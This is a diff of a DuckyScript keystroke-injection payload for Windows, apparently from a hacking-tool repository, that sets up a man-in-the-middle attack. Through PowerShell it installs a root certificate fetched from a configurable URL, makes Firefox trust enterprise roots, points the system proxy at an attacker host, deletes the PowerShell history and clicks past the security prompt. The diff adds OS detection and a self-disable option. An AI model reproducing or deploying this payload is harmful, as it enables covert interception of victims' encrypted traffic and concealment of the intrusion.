@@ -1,72 +1,90 @@
 REM_BLOCK INFOS
     Title: Windows Duck In The Middle
+    Version: 1.0
     Author: Who-Is-Julien
-    Description: The payload configures the target PC user to redirect network traffic via a proxy, enabling a Man-in-the-middle attack.
+    Description: This payload configures the target PC user to redirect network traffic via a proxy, enabling a Man-in-the-middle attack.
     Target: Windows 10, 11
     Documentation: https://github.com/Who-Is-Julien/Ducky-Utilities/blob/main/Payloads/Windows-Duck-In-The-Middle/README.md
 END_REM
 
 REM Required options:
-DEFINE CERT_URL example.com
-DEFINE PROXY_IP 127.0.0.1
-DEFINE PROXY_PORT 8080
+DEFINE #CERT_URL example.com
+DEFINE #PROXY_IP 127.0.0.1
+DEFINE #PROXY_PORT 8080
 
 REM Advanced options:
-DEFINE SHORT_DELAY 500
-DEFINE MEDIUM_DELAY 2000
-DEFINE LONG_DELAY 4000
-DEFINE CONFIGURE_FIREFOX TRUE
+DEFINE #SHORT_DELAY 500
+DEFINE #MEDIUM_DELAY 2000
+DEFINE #LONG_DELAY 4000
+DEFINE #CONFIGURE_FIREFOX TRUE
+DEFINE #DISABLE_AFTER_EXECUTION TRUE
 
-EXTENSION PASSIVE_DETECT_READY
+EXTENSION PASSIVE_WINDOWS_DETECT
     REM VERSION 1.1
     REM AUTHOR: Korben
 
     REM_BLOCK DOCUMENTATION
-        Passive Detect Ready - no injection dynamic boot delay
-        for hosts that reflect current OS lock key state on connect
+        Windows fully passive OS Detection and passive Detect Ready
+        Includes its own passive detect ready.
+        Does not require additional extensions.
 
         USAGE:
             Extension runs inline (here)
             Place at beginning of payload (besides ATTACKMODE) to act as dynamic
             boot delay
+            $_OS will be set to WINDOWS or NOT_WINDOWS
+            See end of payload for usage within payload
     END_REM
 
     REM CONFIGURATION:
     DEFINE #MAX_WAIT 150
     DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+
+    $_OS = #NOT_WINDOWS
 
     VAR $MAX_TRIES = #MAX_WAIT
     WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
         DELAY #CHECK_INTERVAL
         $MAX_TRIES = ($MAX_TRIES - 1)
     END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+
+    REM_BLOCK EXAMPLE USAGE AFTER EXTENSION
+        IF ($_OS == WINDOWS) THEN
+            STRING HELLO WINDOWS!
+        ELSE
+            STRING HELLO WORLD!
+        END_IF
+    END_REM
 END_EXTENSION
 
-CTRL GUI d
-DELAY SHORT_DELAY
-GUI x
-DELAY SHORT_DELAY
-STRING i
-DELAY MEDIUM_DELAY
-STRING Clear-Host; $c = New-TemporaryFile; try { Invoke-WebRequest -UseBasicParsing -Uri " 
-STRING CERT_URL
-STRING " -OutFile $c; Import-Certificate -FilePath $c -CertStoreLocation "Cert:\CurrentUser\Root"; 
-IF ( CONFIGURE_FIREFOX == TRUE ) THEN
-    STRING if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles") { Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "prefs.js" -Recurse | ForEach-Object { (Get-Content $_.FullName) -replace '"security.enterprise_roots.enabled", false', '"security.enterprise_roots.enabled", true' | Set-Content $_.FullName } }; 
+IF ($_OS == WINDOWS) THEN
+    CTRL GUI d
+    DELAY #SHORT_DELAY
+    GUI x
+    DELAY #SHORT_DELAY
+    STRING i
+    DELAY #MEDIUM_DELAY
+    STRING Clear-Host; $c = New-TemporaryFile; try { Invoke-WebRequest -UseBasicParsing -Uri "#CERT_URL" -OutFile $c; Import-Certificate -FilePath $c -CertStoreLocation "Cert:\CurrentUser\Root"; 
+    IF ( #CONFIGURE_FIREFOX == TRUE ) THEN
+        STRING if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles") { Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "prefs.js" -Recurse | ForEach-Object { (Get-Content $_.FullName) -replace '"security.enterprise_roots.enabled", false', '"security.enterprise_roots.enabled", true' | Set-Content $_.FullName } }; 
+    END_IF
+    STRING @{"ProxyServer" = "#PROXY_IP:#PROXY_PORT"; "ProxyEnable" = "1"}.GetEnumerator() | ForEach-Object { Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name $_.Name -Value $_.Value }} finally { Remove-Item $c; Remove-Item (Get-PSreadlineOption).HistorySavePath; exit }
+    DELAY #SHORT_DELAY
+    ENTER
+    DELAY #LONG_DELAY
+    ALT TAB
+    DELAY #SHORT_DELAY
+    TAB
+    DELAY #SHORT_DELAY
+    ENTER
+    DELAY #SHORT_DELAY
+    CTRL GUI F4
 END_IF
-STRING @{"ProxyServer" = "
-STRING PROXY_IP
-STRING :
-STRING PROXY_PORT
-STRING "; "ProxyEnable" = "1"}.GetEnumerator() | ForEach-Object { Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name $_.Name -Value $_.Value }} finally { Remove-Item $c; Remove-Item (Get-PSreadlineOption).HistorySavePath; exit }
-DELAY SHORT_DELAY
-ENTER
-DELAY LONG_DELAY
-ALT TAB
-DELAY SHORT_DELAY
-TAB
-DELAY SHORT_DELAY
-ENTER
-DELAY SHORT_DELAY
-CTRL GUI F4
-ATTACKMODE OFF
+IF ( #DISABLE_AFTER_EXECUTION == TRUE ) THEN
+    ATTACKMODE OFF
+END_IF
